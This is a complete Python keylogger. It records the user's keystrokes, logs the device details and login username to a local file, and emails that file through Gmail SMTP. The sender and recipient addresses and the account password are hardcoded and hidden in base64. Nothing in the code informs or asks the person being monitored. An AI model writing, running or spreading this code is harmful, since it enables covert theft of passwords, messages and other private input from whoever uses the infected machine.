import keyboard
import platform
import os
import datetime
import smtplib
import socket

from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 
import base64

LINE_ESCAPE='enter'
LOG_ESCAPE='esc'
FILE_LOCATION='log.txt'
NEW_LOG=False
EXPORT_LOG=True
REMOTE_SERVER = "www.google.com"


def is_connected(hostname):
	try:
		# resolve the host name and return if a DNS is listening
		host = socket.gethostbyname(hostname)
		# connect to the host and return if the host is reachable
		s = socket.create_connection((host, 80), 2)
		s.close()
		print("Network available")
		return True
	except:
		pass
	print("Network not available")
	return False


def sendLog():
	fromAddr = b'd2V0aGVjaXBoZXJAZ21haWwuY29t'
	toAddr = b'c2dhZ2Fua3VtYXJAZ21haWwuY29t'
	pKey = b'Q2lwaGVyQDEyMw=='	
	msg = MIMEMultipart() 
	msg['From'] = base64.b64decode(fromAddr).decode("utf-8") 
	msg['To'] = base64.b64decode(toAddr).decode("utf-8") 
	msg['Subject'] = "Key Log of User" 
	body = " "
	msg.attach(MIMEText(body, 'plain')) 
	filename = "log.txt"
	attachment = open(filename, "rb")
	p = MIMEBase('application', 'octet-stream') 
	p.set_payload((attachment).read()) 
	encoders.encode_base64(p) 
	p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
	msg.attach(p)
	s = smtplib.SMTP('smtp.gmail.com', 587) 
	s.starttls()
	s.login(base64.b64decode(fromAddr).decode("utf-8"), base64.b64decode(pKey).decode("utf-8")) 
	text = msg.as_string() 
	s.sendmail(base64.b64decode(fromAddr).decode("utf-8"), base64.b64decode(toAddr).decode("utf-8"), text) 
	s.quit()


def systemInfo(NEW_LOG):
	dt=datetime.datetime.now()
	t=dt.strftime(" %d/%m/%Y-%H:%M:%S ")
	if(NEW_LOG):
		#Fetch the System Configurations and the User details
		fileHandler=open(FILE_LOCATION,'w')
		val="------------------\nDEVICE INFORMATION\n------------------\n"
		fileHandler.write(val)
		val="Device name : \t"+str(platform.node())+"\n"
		fileHandler.write(val)
		val="OS platform : \t"+str(platform.platform())+"\n"
		fileHandler.write(val)
		val="OSystem  \t: \t"+str(platform.system())+"\n"
		fileHandler.write(val)
		val="Release \t: \t"+str(platform.release())+"\n"
		fileHandler.write(val)
		val="Version \t: \t"+str(platform.version())+"\n"
		fileHandler.write(val)
		val="\nHARDWARE -\n"
		fileHandler.write(val)
		val="Processor Config\t: "+str(platform.processor())+"\n"
		fileHandler.write(val)
		val="Machine Architecture: "+str(platform.machine())+"\n"
		fileHandler.write(val)

		# val="\nPYTHON DATA -\n"
		# fileHandler.write(val)
		# val="Build\t\t:\t"+str(platform.python_build())+"\n"
		# fileHandler.write(val)
		# val="Compiler\t:\t"+str(platform.python_compiler())+"\n"
		# fileHandler.write(val)
		# val="Branch\t\t:\t"+str(platform.python_branch())+"\n"
		# fileHandler.write(val)
		# val="Implement\t:\t"+str(platform.python_implementation())+"\n"
		# fileHandler.write(val)
		# val="Revision\t:\t"+str(platform.python_revision())+"\n"
		# fileHandler.write(val)
		# val="Version\t\t:\t"+str(platform.python_version())+"\n"
		# fileHandler.write(val)
		val="\nUSER DETAILS\n"
		fileHandler.write(val)
		val="USERNAME\t:\t"+str(os.getlogin())+"\n"
		fileHandler.write(val)
		val="\n\nKEY LOGS\n"
		fileHandler.write(val)
		fileHandler.write("System Time : "+t+"\n\n")
		fileHandler.close()
	else:
		fileHandler=open(FILE_LOCATION,'a')
		val="\n\nNEXT LOG\n"
		fileHandler.write(val)
		fileHandler.write("System Time : "+t+"\n\n")
		fileHandler.close()


def generateWords(keys):
	# print('keys :',keys)
	words=''
	line=[]
	exceptionsArr=['up','down','left','right']
	for ele in keys:
		if (ele=='space'):
			# print(words)
			line.append(words)
			words=''
		elif(ele in exceptionsArr):
			#print(words)
			line.append(words)
			line.append(ele)
			words=''
			#print(ele)
			#words=''
		elif (ele=='enter'):
			# print(words)
			line.append(words)
			line.append('EnterKey')
			words=''
		elif (ele=='backspace'):
			words=words[:-1]
		elif (ele=='shift'):
			# print(words)
			line.append(words)
			# print('ShiftKey')
			line.append('ShiftKey')
			words=''
		elif (ele=='ctrl'):
			# print(words)
			line.append(words)
			# print('CtrlKey')
			line.append('CtrlKey')
			words=''
		else:
			words=words+ele
	# print(words)
	line.append(words)
	return str(line)


def writeLog(keys):
	line=generateWords(keys)
	fileHandler=open(FILE_LOCATION,'a')
	# print('line :',line)
	fileHandler.write(line)
	fileHandler.write('\n')
	fileHandler.close()


def keyLogger():
	#Function to Record key strokes
	keyEvents=keyboard.record(until=LINE_ESCAPE)
	#print("Keyboard Events : ",keyEvents)

	#Clean the keyEvents
	Active=True
	keys=[]
	for event in keyEvents:
		attr=str(event)
		attr=attr.split()
		keyArr=attr[0].split('(')
		actionArr=attr[1].split(')')
		key=keyArr[1]
		action=actionArr[0]
		# print(key,':',action) 	#Print the key pressed and the event occured.
		
		if(action=='down'):
			keys.append(key)
		if(key==LOG_ESCAPE):
			Active=False

	#TODO : write keys into file.
	# print(keys)
	writeLog(keys)
	return Active


def keySimulator(keys):
	#Perform Actions stored in the log
	keyboard.play(keys,speed_factor = 1)


def main():
	connected=is_connected(REMOTE_SERVER)
	if(connected):
		if(EXPORT_LOG):
			sendLog()
			NEW_LOG=True
	print(NEW_LOG)
	systemInfo(NEW_LOG)
	Active=True
	while(Active):
		Active=keyLogger()


main()